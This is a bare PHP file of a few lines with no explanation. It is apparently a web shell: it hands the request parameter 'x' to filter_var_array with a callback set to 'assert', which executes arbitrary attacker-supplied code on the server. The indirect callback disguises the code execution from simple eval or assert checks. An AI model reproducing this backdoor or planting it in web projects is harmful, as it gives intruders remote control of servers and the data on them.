<?php
    filter_var_array(array('test' => $_REQUEST['x']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
	exit;
?>